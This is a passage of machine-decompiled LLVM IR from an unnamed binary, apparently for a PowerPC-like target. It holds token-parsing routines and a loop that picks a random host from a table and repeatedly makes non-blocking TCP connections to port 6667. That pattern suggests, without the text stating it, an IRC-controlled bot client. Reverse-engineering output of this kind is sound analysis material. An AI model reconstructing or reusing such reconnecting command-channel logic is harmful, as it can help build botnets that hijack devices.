dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039a4.preheader, %dec_label_pc_10003998
  %storemerge946 = phi i32 [ %v1_1000399c, %dec_label_pc_10003998 ], [ 0, %dec_label_pc_100039a4.preheader ]
  %v2_100039c8 = add i32 %storemerge946, %v1_10003954
  %v1_100039cc = inttoptr i32 %v2_100039c8 to i8*
  %v2_100039cc = load i8, i8* %v1_100039cc, align 1
  %v3_100039d4 = icmp eq i8 %v2_100039cc, 32
  br i1 %v3_100039d4, label %dec_label_pc_100039dc, label %dec_label_pc_10003998

dec_label_pc_100039dc:                            ; preds = %dec_label_pc_10003998, %dec_label_pc_100039bc, %dec_label_pc_100039a4.preheader
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_100039a4.preheader ], [ %v1_1000399c, %dec_label_pc_10003998 ], [ %storemerge946, %dec_label_pc_100039bc ]
  %v2_100039e8 = add i32 %storemerge9.lcssa, %v1_10003954
  %v3_100039f0 = inttoptr i32 %v2_100039e8 to i8*
  store i8 0, i8* %v3_100039f0, align 1
  %v3_100039f8 = load i32, i32* @global_var_10010474.145, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  store i32 %v3_100039f8, i32* @r4, align 4
  %v3_10003a04 = call i32 @function_1000735c(i32 %v1_10003954, i32 %v3_100039f8)
  %v3_10003a0c = icmp eq i32 %v3_10003a04, 0
  br i1 %v3_10003a0c, label %dec_label_pc_10003a14, label %dec_label_pc_10003c2c

dec_label_pc_10003a14:                            ; preds = %dec_label_pc_100039dc
  %v3_10003a18 = load i32, i32* @global_var_10010464.16, align 4
  %v3_10003a1c = icmp eq i32 %v3_10003a18, 0
  br i1 %v3_10003a1c, label %dec_label_pc_10003a24, label %dec_label_pc_10003c2c

dec_label_pc_10003a24:                            ; preds = %dec_label_pc_10003a14
  br label %dec_label_pc_10003a58.preheader

dec_label_pc_10003a40:                            ; preds = %dec_label_pc_10003a70
  %v4_10003a70 = ptrtoint i8* %stack_var_-68.233 to i32
  %v1_10003a44 = add i32 %v4_10003a70, 1
  %v5_10003a48 = inttoptr i32 %v1_10003a44 to i8*
  %v1_10003a50 = add i32 %stack_var_-60.232, 1
  store i32 %v1_10003a50, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a60 = call i32 @function_10006ed4()
  %v0_10003a68 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a68 = icmp ult i32 %v0_10003a68, %v0_10003a60
  br i1 %v2_10003a68, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003a70:                            ; preds = %dec_label_pc_10003a58.preheader, %dec_label_pc_10003a40
  %stack_var_-68.233 = phi i8* [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.339, %dec_label_pc_10003a58.preheader ]
  %stack_var_-60.232 = phi i32 [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.338, %dec_label_pc_10003a58.preheader ]
  %v2_10003a74 = load i8, i8* %stack_var_-68.233, align 1
  %v3_10003a7c = icmp eq i8 %v2_10003a74, 32
  br i1 %v3_10003a7c, label %dec_label_pc_10003a84, label %dec_label_pc_10003a40

dec_label_pc_10003a84:                            ; preds = %dec_label_pc_10003a40, %dec_label_pc_10003a70, %dec_label_pc_10003a58.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.338, %dec_label_pc_10003a58.preheader ], [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.232, %dec_label_pc_10003a70 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.339, %dec_label_pc_10003a58.preheader ], [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.233, %dec_label_pc_10003a70 ]
  %v4_10003a84 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10003a88 = add i32 %v4_10003a84, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a98 = call i32 @function_10006ed4()
  %v0_10003aa0 = load i32, i32* %r29.global-to-local, align 4
  %v4_10003aa0 = icmp eq i32 %v0_10003aa0, %v0_10003a98
  br i1 %v4_10003aa0, label %dec_label_pc_10003c2c, label %dec_label_pc_10003aa8

dec_label_pc_10003aa8:                            ; preds = %dec_label_pc_10003a84
  %v5_10003a8c = inttoptr i32 %v1_10003a88 to i8*
  %v1_10003aac = add nuw nsw i32 %storemerge1040, 1
  %tmp92 = icmp slt i32 %v1_10003aac, 3
  br i1 %tmp92, label %dec_label_pc_10003a58.preheader, label %dec_label_pc_10003ad8.preheader

dec_label_pc_10003a58.preheader:                  ; preds = %dec_label_pc_10003a24, %dec_label_pc_10003aa8
  %storemerge1040 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %v1_10003aac, %dec_label_pc_10003aa8 ]
  %stack_var_-68.339 = phi i8* [ %arg3, %dec_label_pc_10003a24 ], [ %v5_10003a8c, %dec_label_pc_10003aa8 ]
  %stack_var_-60.338 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10003aa8 ]
  store i32 %stack_var_-60.338, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a6027 = call i32 @function_10006ed4()
  %v0_10003a6828 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a6829 = icmp ult i32 %v0_10003a6828, %v0_10003a6027
  br i1 %v2_10003a6829, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003ad8.preheader:                  ; preds = %dec_label_pc_10003aa8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae018 = call i32 @function_10006ed4()
  %v0_10003ae819 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae820 = icmp ult i32 %v0_10003ae819, %v0_10003ae018
  br i1 %v2_10003ae820, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003acc:                            ; preds = %dec_label_pc_10003af0
  %v1_10003ad0 = add i32 %storemerge1123, 1
  store i32 %v1_10003ad0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae0 = call i32 @function_10006ed4()
  %v0_10003ae8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae8 = icmp ult i32 %v0_10003ae8, %v0_10003ae0
  br i1 %v2_10003ae8, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003af0:                            ; preds = %dec_label_pc_10003ad8.preheader, %dec_label_pc_10003acc
  %storemerge1123 = phi i32 [ %v1_10003ad0, %dec_label_pc_10003acc ], [ 0, %dec_label_pc_10003ad8.preheader ]
  %v2_10003afc = add i32 %storemerge1123, %v1_10003a88
  %v1_10003b00 = inttoptr i32 %v2_10003afc to i8*
  %v2_10003b00 = load i8, i8* %v1_10003b00, align 1
  %v3_10003b08 = icmp eq i8 %v2_10003b00, 32
  br i1 %v3_10003b08, label %dec_label_pc_10003b10, label %dec_label_pc_10003acc

dec_label_pc_10003b10:                            ; preds = %dec_label_pc_10003acc, %dec_label_pc_10003af0, %dec_label_pc_10003ad8.preheader
  %storemerge11.lcssa = phi i32 [ 0, %dec_label_pc_10003ad8.preheader ], [ %v1_10003ad0, %dec_label_pc_10003acc ], [ %storemerge1123, %dec_label_pc_10003af0 ]
  %v2_10003b1c = add i32 %storemerge11.lcssa, %v1_10003a88
  %v3_10003b24 = inttoptr i32 %v2_10003b1c to i8*
  store i8 0, i8* %v3_10003b24, align 1
  store i32 268450608, i32* @lr, align 4
  %v2_10003b2c = call i32 @function_1000776c(i32 %v1_10003a88)
  %v5_10003b34 = trunc i32 %v2_10003b2c to i8
  store i8 %v5_10003b34, i8* %stack_var_-56, align 1
  %v4_10003b40 = icmp eq i8 %v5_10003b34, -1
  br i1 %v4_10003b40, label %dec_label_pc_10003b48, label %dec_label_pc_10003bb4

dec_label_pc_10003b48:                            ; preds = %dec_label_pc_10003b10
  store i32 268450640, i32* @lr, align 4
  %v3_10003b4c = call i32 @function_100077a0(i32 %v1_10003a88, i32 %v2_10003b2c)
  %v3_10003b5c = icmp eq i32 %v3_10003b4c, 0
  br i1 %v3_10003b5c, label %dec_label_pc_10003b64, label %dec_label_pc_10003b88

dec_label_pc_10003b64:                            ; preds = %dec_label_pc_10003b48
  %v3_10003b68 = load i32, i32* @global_var_10010488.143, align 4
  %v5_10003b80 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1000dc60.163 to i32), i32 %v3_10003b68, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10003c2c

dec_label_pc_10003b88:                            ; preds = %dec_label_pc_10003b48
  %v2_10003b88 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10003b90 = add i32 %v3_10003b4c, 16
  %v2_10003b90 = inttoptr i32 %v1_10003b90 to i32*
  %v3_10003b90 = load i32, i32* %v2_10003b90, align 4
  %v1_10003b94 = inttoptr i32 %v3_10003b90 to i32*
  %v2_10003b94 = load i32, i32* %v1_10003b94, align 4
  %v1_10003b9c = add i32 %v3_10003b4c, 12
  %v2_10003b9c = inttoptr i32 %v1_10003b9c to i32*
  %v3_10003b9c = load i32, i32* %v2_10003b9c, align 4
  store i32 %v2_10003b88, i32* @r3, align 4
  store i32 %v2_10003b94, i32* @r4, align 4
  store i32 %v3_10003b9c, i32* @r5, align 4
  store i32 268450740, i32* @lr, align 4
  %v0_10003bb0 = call i32 @function_10006d88()
  %v2_10003bc4.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10003bb4

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003b10, %dec_label_pc_10003b88
  %v0_10003c4475 = phi i32 [ %v0_10003bb0, %dec_label_pc_10003b88 ], [ %v2_10003b2c, %dec_label_pc_10003b10 ]
  %v2_10003bc4 = phi i8 [ %v2_10003bc4.pre, %dec_label_pc_10003b88 ], [ %v5_10003b34, %dec_label_pc_10003b10 ]
  store i8 %v2_10003bc4, i8* bitcast (i8** @global_var_10010463.165 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_10010460.15 to i8*), align 4
  store i32 256, i32* @global_var_10010464.16, align 4
  br label %dec_label_pc_10003c2c

dec_label_pc_10003c2c:                            ; preds = %dec_label_pc_10003950, %dec_label_pc_10003a84, %dec_label_pc_10003a14, %dec_label_pc_100039dc, %dec_label_pc_10003b64, %dec_label_pc_10003bb4
  %v0_10003c44 = phi i32 [ 0, %dec_label_pc_10003a14 ], [ %v3_10003a04, %dec_label_pc_100039dc ], [ %v5_10003b80, %dec_label_pc_10003b64 ], [ %v0_10003c4475, %dec_label_pc_10003bb4 ], [ %v0_10003a98, %dec_label_pc_10003a84 ], [ %v0_10003964, %dec_label_pc_10003950 ]
  %v2_10003c2c = load i32, i32* %stack_var_-80, align 4
  %v1_10003c38 = add i32 %v2_10003c2c, -12
  %v2_10003c38 = inttoptr i32 %v1_10003c38 to i32*
  %v3_10003c38 = load i32, i32* %v2_10003c38, align 4
  store i32 %v3_10003c38, i32* %r29.global-to-local, align 4
  ret i32 %v0_10003c44

; uselistorder directives
  uselistorder i32 %v2_10003b2c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.338, { 2, 0, 1 }
  uselistorder i32 %v1_10003aac, { 1, 0 }
  uselistorder i32 %v1_10003a88, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.162, { 2, 0, 1 }
  uselistorder i32 %v1_10003978, { 1, 0 }
  uselistorder i32 %v1_10003954, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 13, 14, 15, 16, 3, 4, 5, 6, 7, 8, 17, 18, 19, 20, 9, 10, 11, 12 }
  uselistorder i8** @global_var_10010460.15, { 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_10010464.16, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003c2c, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10003bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10003b10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003af0, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100039dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100039bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003924.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003950, { 2, 1, 0 }
}

define i32 @function_10003c48(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10003c48:
  %v3_10003c6c = load i32, i32* @global_var_10010474.145, align 4
  store i32 268450936, i32* @lr, align 4
  %v1_10003c74 = call i32 @function_10007e44(i32 %v3_10003c6c)
  store i32 268450940, i32* @lr, align 4
  %v0_10003c78 = call i32 @function_100007d4()
  store i32 %v0_10003c78, i32* @global_var_10010474.145, align 4
  ret i32 %v0_10003c78
}

define i32 @function_10003ca0(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10003ca0:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce43 = call i32 @function_10006ed4()
  %v2_10003cec5 = icmp eq i32 %v0_10003ce43, 0
  br i1 %v2_10003cec5, label %dec_label_pc_10003d14, label %dec_label_pc_10003cf4

dec_label_pc_10003cd0:                            ; preds = %dec_label_pc_10003cf4
  %v1_10003cd4 = add i32 %storemerge28, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce4 = call i32 @function_10006ed4()
  %v2_10003cec = icmp ult i32 %v1_10003cd4, %v0_10003ce4
  br i1 %v2_10003cec, label %dec_label_pc_10003cf4, label %dec_label_pc_10003d14

dec_label_pc_10003cf4:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cd0
  %storemerge28 = phi i32 [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ 0, %dec_label_pc_10003ca0 ]
  %v2_10003d00 = add i32 %storemerge28, %arg2
  %v1_10003d04 = inttoptr i32 %v2_10003d00 to i8*
  %v2_10003d04 = load i8, i8* %v1_10003d04, align 1
  %v3_10003d0c = icmp eq i8 %v2_10003d04, 33
  br i1 %v3_10003d0c, label %dec_label_pc_10003d14, label %dec_label_pc_10003cd0

dec_label_pc_10003d14:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cd0, %dec_label_pc_10003cf4
  %storemerge2.lcssa = phi i32 [ 0, %dec_label_pc_10003ca0 ], [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ %storemerge28, %dec_label_pc_10003cf4 ]
  %v2_10003d20 = add i32 %storemerge2.lcssa, %arg2
  %v3_10003d28 = inttoptr i32 %v2_10003d20 to i8*
  store i8 0, i8* %v3_10003d28, align 1
  %v3_10003d30 = load i32, i32* @global_var_10010474.145, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 %v3_10003d30, i32* @r4, align 4
  %v2_10003d3c = call i32 @function_1000735c(i32 %arg2, i32 %v3_10003d30)
  %v3_10003d44 = icmp eq i32 %v2_10003d3c, 0
  br i1 %v3_10003d44, label %dec_label_pc_10003d4c, label %dec_label_pc_10003da0

dec_label_pc_10003d4c:                            ; preds = %dec_label_pc_10003d14
  %v2_10003d50 = load i8, i8* %arg3, align 1
  %v3_10003d58 = icmp eq i8 %v2_10003d50, 58
  br i1 %v3_10003d58, label %dec_label_pc_10003d60, label %dec_label_pc_10003d6c

dec_label_pc_10003d60:                            ; preds = %dec_label_pc_10003d4c
  %v1_10003d64 = add i32 %tmp, 1
  %v5_10003d68 = inttoptr i32 %v1_10003d64 to i8*
  br label %dec_label_pc_10003d6c

dec_label_pc_10003d6c:                            ; preds = %dec_label_pc_10003d4c, %dec_label_pc_10003d60
  %stack_var_-32.0 = phi i8* [ %v5_10003d68, %dec_label_pc_10003d60 ], [ %arg3, %dec_label_pc_10003d4c ]
  %v3_10003d70 = load i32, i32* @global_var_10010474.145, align 4
  %v3_10003d74 = icmp eq i32 %v3_10003d70, 0
  br i1 %v3_10003d74, label %dec_label_pc_10003d8c, label %dec_label_pc_10003d7c

dec_label_pc_10003d7c:                            ; preds = %dec_label_pc_10003d6c
  store i32 268451212, i32* @lr, align 4
  %v1_10003d88 = call i32 @function_10007e44(i32 %v3_10003d70)
  br label %dec_label_pc_10003d8c

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_10003d6c, %dec_label_pc_10003d7c
  %v4_10003d8c = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 268451220, i32* @lr, align 4
  %v2_10003d90 = call i32 @function_100073ac(i32 %v4_10003d8c)
  store i32 %v2_10003d90, i32* @global_var_10010474.145, align 4
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003d14, %dec_label_pc_10003d8c
  %v0_10003db8 = phi i32 [ %v2_10003d3c, %dec_label_pc_10003d14 ], [ %v2_10003d90, %dec_label_pc_10003d8c ]
  ret i32 %v0_10003db8

; uselistorder directives
  uselistorder i32 %v1_10003cd4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_10003da0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003cf4, { 1, 0 }
}

define i32 @function_10003dbc() local_unnamed_addr {
dec_label_pc_10003dbc:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_10003ef4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10003ef8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10003f50 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_10003dd4

dec_label_pc_10003dd4:                            ; preds = %dec_label_pc_10003dd4.backedge, %dec_label_pc_10003dbc
  store i32 -1, i32* @global_var_10010478.10, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_10003dec = load i32, i32* @global_var_10010458.107, align 4
  %v3_10003df0 = icmp eq i32 %v3_10003dec, 0
  br i1 %v3_10003df0, label %dec_label_pc_10003df8, label %dec_label_pc_10003e30

dec_label_pc_10003df8:                            ; preds = %dec_label_pc_10003dd4
  store i32 268451324, i32* @lr, align 4
  %v0_10003df8 = call i32 @function_10008158()
  %v3_10003e04 = load i32, i32* @global_var_10010410.168, align 4
  %v2_10003e08 = srem i32 %v0_10003df8, %v3_10003e04
  %v1_10003e1c = mul i32 %v2_10003e08, 4
  %v2_10003e20 = add i32 %v1_10003e1c, ptrtoint ([16 x i8]** @global_var_10010414.170 to i32)
  %v1_10003e24 = inttoptr i32 %v2_10003e20 to i32*
  %v2_10003e24 = load i32, i32* %v1_10003e24, align 4
  store i32 %v2_10003e24, i32* @global_var_10010480.106, align 4
  br label %dec_label_pc_10003e30

dec_label_pc_10003e30:                            ; preds = %dec_label_pc_10003dd4, %dec_label_pc_10003df8
  store i32 0, i32* @global_var_10010458.107, align 4
  br label %dec_label_pc_10003e3c

dec_label_pc_10003e3c:                            ; preds = %dec_label_pc_10003e3c, %dec_label_pc_10003e30
  store i32 268451404, i32* @lr, align 4
  %v3_10003e48 = call i32 @function_10007cb8(i32 2, i32 1, i32 6)
  store i32 %v3_10003e48, i32* @global_var_10010478.10, align 4
  %v1_10003e60 = icmp slt i32 %v3_10003e48, 0
  br i1 %v1_10003e60, label %dec_label_pc_10003e3c, label %dec_label_pc_10003e68

dec_label_pc_10003e68:                            ; preds = %dec_label_pc_10003e3c
  %v3_10003e6c = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451448, i32* @lr, align 4
  %v1_10003e74 = call i32 @function_1000776c(i32 %v3_10003e6c)
  %v3_10003e7c = icmp eq i32 %v1_10003e74, 0
  br i1 %v3_10003e7c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003e84

dec_label_pc_10003e84:                            ; preds = %dec_label_pc_10003e68
  %v3_10003e88 = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451476, i32* @lr, align 4
  %v1_10003e90 = call i32 @function_1000776c(i32 %v3_10003e88)
  %v4_10003e9c = icmp eq i32 %v1_10003e90, -1
  br i1 %v4_10003e9c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003f18

dec_label_pc_10003ea4:                            ; preds = %dec_label_pc_10003e84, %dec_label_pc_10003e68
  %v3_10003ea8 = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451508, i32* @lr, align 4
  %v2_10003eb0 = call i32 @function_100077a0(i32 %v3_10003ea8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10003ec0 = icmp eq i32 %v2_10003eb0, 0
  br i1 %v3_10003ec0, label %dec_label_pc_10003ec8, label %dec_label_pc_10003ee8

dec_label_pc_10003ec8:                            ; preds = %dec_label_pc_10003ea4
  store i32 0, i32* @global_var_10010480.106, align 4
  %v3_10003ed8 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451556, i32* @lr, align 4
  %v1_10003ee0 = call i32 @function_100048e0(i32 %v3_10003ed8)
  br label %dec_label_pc_10003dd4.backedge

dec_label_pc_10003dd4.backedge:                   ; preds = %dec_label_pc_10003ec8, %dec_label_pc_10004080
  br label %dec_label_pc_10003dd4

dec_label_pc_10003ee8:                            ; preds = %dec_label_pc_10003ea4
  %v1_10003eec = add i32 %v2_10003eb0, 16
  %v2_10003eec = inttoptr i32 %v1_10003eec to i32*
  %v3_10003eec = load i32, i32* %v2_10003eec, align 4
  %v1_10003ef0 = inttoptr i32 %v3_10003eec to i32*
  %v2_10003ef0 = load i32, i32* %v1_10003ef0, align 4
  %v1_10003f00 = add i32 %v2_10003eb0, 12
  %v2_10003f00 = inttoptr i32 %v1_10003f00 to i32*
  %v3_10003f00 = load i32, i32* %v2_10003f00, align 4
  store i32 %v3_10003f00, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10003f14.171 to i32), i32* @lr, align 4
  %v4_10003f10 = call i32 @function_1000734c(i32 %v2_10003ef0, i32 %v2_10003ef8, i32 %v3_10003f00, i32 %v2_10003eb0)
  br label %dec_label_pc_10003f30

dec_label_pc_10003f18:                            ; preds = %dec_label_pc_10003e84
  %v3_10003f1c = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451624, i32* @lr, align 4
  %v1_10003f24 = call i32 @function_1000776c(i32 %v3_10003f1c)
  store i32 %v1_10003f24, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10003f30

dec_label_pc_10003f30:                            ; preds = %dec_label_pc_10003ee8, %dec_label_pc_10003f18
  store i32 2, i32* %stack_var_-28, align 4
  store i32 6667, i32* @r3, align 4
  %v1_10003f3c = call i32 @function_10007640(i32 6667)
  %v3_10003f4c = load i32, i32* @global_var_10010478.10, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003f6c.172 to i32), i32* @lr, align 4
  %v3_10003f68 = call i32 @function_100047f8(i32 %v3_10003f4c, i32 -2147195266, i32 %v2_10003f50)
  store i32 268451700, i32* @lr, align 4
  %v1_10003f70 = call i32 @function_10004a90(i32 0)
  store i32 268451944, i32* @lr, align 4
  %v1_1000406411 = call i32 @function_10004a90(i32 0)
  %v2_1000407412 = sub i32 %v1_1000406411, %v1_10003f70
  %tmp1016 = icmp ult i32 %v2_1000407412, 10
  br i1 %tmp1016, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10003f80:                            ; preds = %dec_label_pc_10003f30, %dec_label_pc_10004058
  %v0_10003f80 = call i32 @function_10004b48()
  %v2_10003f8c = inttoptr i32 %v0_10003f80 to i32*
  store i32 0, i32* %v2_10003f8c, align 4
  %v3_10003f94 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451756, i32* @lr, align 4
  %v3_10003fa8 = call i32 @function_10007ba0(i32 %v3_10003f94, i32 %v2_10003ef4, i32 16)
  %v3_10003fb0 = icmp eq i32 %v3_10003fa8, 0
  br i1 %v3_10003fb0, label %dec_label_pc_10003fcc, label %dec_label_pc_10003fb8

dec_label_pc_10003fb8:                            ; preds = %dec_label_pc_10003f80
  %v0_10003fb8 = call i32 @function_10004b48()
  %v1_10003fc0 = inttoptr i32 %v0_10003fb8 to i32*
  %v2_10003fc0 = load i32, i32* %v1_10003fc0, align 4
  %v3_10003fc4 = icmp eq i32 %v2_10003fc0, 106
  br i1 %v3_10003fc4, label %dec_label_pc_10003fcc, label %dec_label_pc_10004030

dec_label_pc_10003fcc:                            ; preds = %dec_label_pc_10003fb8, %dec_label_pc_10003f80
  %v3_10003fd0 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451820, i32* @lr, align 4
  %v6_10003fe8 = call i32 @function_10007c7c(i32 %v3_10003fd0, i32 1, i32 13, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10003ff0 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451852, i32* @lr, align 4
  %v6_10004008 = call i32 @function_10007c7c(i32 %v3_10003ff0, i32 1, i32 2, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10004010 = load i32, i32* @global_var_10010478.10, align 4
  store i32 ptrtoint (i32* @global_var_1000402c.173 to i32), i32* @lr, align 4
  %v6_10004028 = call i32 @function_10007c7c(i32 %v3_10004010, i32 1, i32 9, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v6_10004028

dec_label_pc_10004030:                            ; preds = %dec_label_pc_10003fb8
  %v0_10004030 = call i32 @function_10004b48()
  %v1_10004038 = inttoptr i32 %v0_10004030 to i32*
  %v2_10004038 = load i32, i32* %v1_10004038, align 4
  %v3_1000403c = icmp eq i32 %v2_10004038, 115
  br i1 %v3_1000403c, label %dec_label_pc_10004058, label %dec_label_pc_10004044

dec_label_pc_10004044:                            ; preds = %dec_label_pc_10004030
  %v0_10004044 = call i32 @function_10004b48()
  %v1_1000404c = inttoptr i32 %v0_10004044 to i32*
  %v2_1000404c = load i32, i32* %v1_1000404c, align 4
  %v3_10004050 = icmp eq i32 %v2_1000404c, 114
  br i1 %v3_10004050, label %dec_label_pc_10004058, label %dec_label_pc_10004080

dec_label_pc_10004058:                            ; preds = %dec_label_pc_10004044, %dec_label_pc_10004030
  store i32 ptrtoint ([3 x i8]* @global_var_10004060.174 to i32), i32* @lr, align 4
  %v1_1000405c = call i32 @function_10008a10(i32 1)
  store i32 268451944, i32* @lr, align 4
  %v1_10004064 = call i32 @function_10004a90(i32 0)
  %v2_10004074 = sub i32 %v1_10004064, %v1_10003f70
  %tmp10 = icmp ult i32 %v2_10004074, 10
  br i1 %tmp10, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10004080:                            ; preds = %dec_label_pc_10004058, %dec_label_pc_10004044, %dec_label_pc_10003f30
  store i32 0, i32* @global_var_10010480.106, align 4
  %v3_10004090 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451996, i32* @lr, align 4
  %v1_10004098 = call i32 @function_100048e0(i32 %v3_10004090)
  br label %dec_label_pc_10003dd4.backedge

; uselistorder directives
  uselistorder i32 %v1_10003f70, { 1, 0 }
  uselistorder i32 %v3_10003f00, { 1, 0 }
  uselistorder i32 %v2_10003eb0, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10007c7c, { 2, 1, 0 }
  uselistorder i32 268451944, { 1, 0 }
  uselistorder i32 (i32)* @function_10007640, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000734c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_100077a0, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10008158, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10003f80, { 1, 0 }
  uselistorder label %dec_label_pc_10003f30, { 1, 0 }
  uselistorder label %dec_label_pc_10003dd4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10003e30, { 1, 0 }
}

define i32 @function_100040b8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100040b8:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-6180 = alloca i32, align 4
  %stack_var_-5156 = alloca i32, align 4
  %stack_var_-4132 = alloca i32, align 4
  %stack_var_-6316 = alloca i32, align 4
  %stack_var_-6616 = alloca i32, align 4
  %stack_var_-6308 = alloca i32, align 4
  store i32 268452060, i32* @lr, align 4
  %v0_100040d8 = call i32 @function_10004928()
  %v3_100040e0 = icmp eq i32 %v0_100040d8, 0
  br i1 %v3_100040e0, label %dec_label_pc_100040f0, label %dec_label_pc_100040e8

dec_label_pc_100040e8:                            ; preds = %dec_label_pc_100040b8
  %v0_100040ec = call i32 @function_10008858()
  br label %dec_label_pc_100040f0

dec_label_pc_100040f0:                            ; preds = %dec_label_pc_100040b8, %dec_label_pc_100040e8
  %v2_100040f4 = load i32, i32* %arg2, align 4
  store i32 %v2_100040f4, i32* @r3, align 4
  %v0_10004104 = call i32 @function_10006ed4()
